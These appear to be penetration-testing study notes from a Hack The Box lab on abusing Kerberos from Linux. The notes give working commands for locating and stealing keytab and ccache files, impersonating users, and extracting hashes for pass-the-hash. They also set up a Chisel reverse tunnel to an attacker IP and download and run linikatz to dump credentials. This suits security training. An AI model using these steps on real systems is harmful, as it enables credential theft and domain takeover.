### Kerberos on Linux
- Generally Linux machines store Kerberos tickets as _ccache_ files in the `/tmp` directory.
	- By default the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`. This variable can identify if Kerberos tickets are being used or if the default ticket storage location has changed.
- Another use of Kerberos in Linux is [keytab](https://kb.iu.edu/d/aumh) files. 
	- A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password)
	- You can use a keytab file to authenticate to remote systems using Kerberos without entering a password.
		- However, they keytabs must be regenerated on a password change.
	- Keytabs commonly allow scripts to authenticate automatically.
	- Any computer that has a Kerberos client installed can create keytab files.

### Identifying Linux and Active Directory Integration
- We can see if a Linux host is domain joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd)
	- `realm list`
		- The output will let us know if the machine is a kerberos member.
- If realm is not available there are [other indicators](https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) of AD integration
	- Services:
		- [sssd](https://sssd.io/)
		- [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html)
			- `ps -ef | grep -i "windbind\|sssd"`

### Finding Keytab Files
- **Use search**
	- `find / -name *keytab* -ls 2>/dev/null`
	- **Note: To use a keytab file, we must have read and write (rw) privileges on the file**
- **In cronjobs**
	- `crontab -l`
	- If we see the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) that means Kerberos is in use.
		- This will often be importing a keytab (`.kb`) into the session to act as the user.
- **Note:** As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. 
	- The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

### Finding ccache Files
- A ccache (credential cache) file holds Kerberos creds while they remain valid and usually while the user's session lasts.
	- Once a user authenticates to a domain, a ccache file is created that stores the ticket information.
	- The path to this file is placed in the `KRB5CCNAME` environment variable.
		- This variable is used by tools to find the Kerberos data.
- If we get root we can impersonate a user using their ccache file while it's still valid.

- **In environment variables**
	- `env | grep -i krb5`
- **In /tmp**
	- `ls -la /tmp`

## Abusing KeyTab Files
- We can impersonate a user with `kinit`
- To use a keytab file we need to know which user it belongs to.
	- `klist` will read information on the keytab

- **List keytab File Information**
	- `klist -k -t`
	- ![[2023-03-29 14_50_23-Hack The Box - Academy.png]]
- **Impersonate a User with a keytab**	
	 - We can now impersonate the user with `kinit`. 
	 - `kinit` is case sensitive so use the name of the principal as shown in klist.
		 - `kinit user@domain -k -t /path/to/keytab`
		 - ![[2023-03-29 14_53_25-Hack The Box - Academy.png|700]]
		 - **Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable `KRB5CCNAME`.
	- We can attempt to access a shared folder to confirm our access
		- `smbclient //dc01/carlos -k -c ls`

#### Keytab Extract
- The second abuse method is extracting secrets from a keytab file. If we want to gain access to a users' account on the linux machine we will need their password
- We can attempt to crack the account password by extracting the hashes from the keytab
	- We can use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

- **Extracting Keytab hashes with KeyTabExtract**
- `python3 keytabextract.py user.keytab`
- This will generally return one or more hashes
	- With the NTLM hash we can perform a pass the hash attack or attempt to crack
	- With the aes256 or aes128 we can forge tickets using Rubeus

**Login as User**
- If we get a plaintext password
	- `su - user@domain`
	- **Repeat process to get root**

## Abusing Keytab ccache
- Escalate to Root:
	- `sudo su`
- Look for ccache files
	- `ls -la /tmp` - see what users own what ccaches and which have not expired
- If we find a user that belongs to the domain admin group (`id user@domain`) we can impersonate that user and gain access to the domain controller.

- **Importing the ccache file into our current session**
	- `cp /tmp/krb5cc_<random> .` - copy the ccache file for the user we want
	- `export KRB5CCNAME=/path/to/krb5cc_<random>` - set the env var to the stolen ccache
	- `klist` - make sure that it worked

## Using Linux Attack Tools with Kerberos
- If our attack box is not a member of the domain, we need to make sure our machine can contact the KDC or DC and that domain name resolution is working.
- We can proxy our traffic through a domain host using Chisel and Proxychains and edit the /etc/hosts file to hardcode IP addresses of the domain and target machines.

### Setup

1. Modify Host File
![[2023-03-29 16_22_36-Hack The Box - Academy.png|700]]
2. Modify Proxychains Configuration File to use socks5 and port 1080
![[2023-03-29 16_23_20-Hack The Box - Academy.png|400]]
3. Download Chisel on Attack Host
``` bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```
4. RDP into MS01 with xfreerdp
5. Run chisel on MS01
```cmd
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
6. Transfer the ccache file from the Linux Machine and create the environment variable
``` bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

#### Impacket with proxychains and Kerberos Auth
``` bash
proxychains impacket-wmiexec ms01 -k
```

- **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the` FILE:` prefix in the `KRB5CCNAME` variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

#### Evil-Winrm with Kerberos
- To use evil-winrm with Kerberos we need to install the Kerberos package used for network authentication.
	- On Kali and Parrot its installed via apt and called `krb5-user`
		- During install, set the domain name realm and KDC to the ones for the target.
		- If already installed, change `/etc/krb5.conf` 
			- ![[2023-03-29 16_32_46-Hack The Box - Academy.png|400]]
- Once that is set:
``` bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```


## Miscellaneous
- If we want to use a ccache file in windows or a kirbi file on Linux we can use Â [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them.
	- `impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi`
- To use the kirbi file on windows:
	- `C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi`

## [Linikatz](https://github.com/CiscoCXSecurity/linikatz)
- Like mimikaz but for linux
- Requires root
- Extracts all credentials and puts them in a folder whose name starts with `linikatz.`
``` bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
./linikatz.sh
```
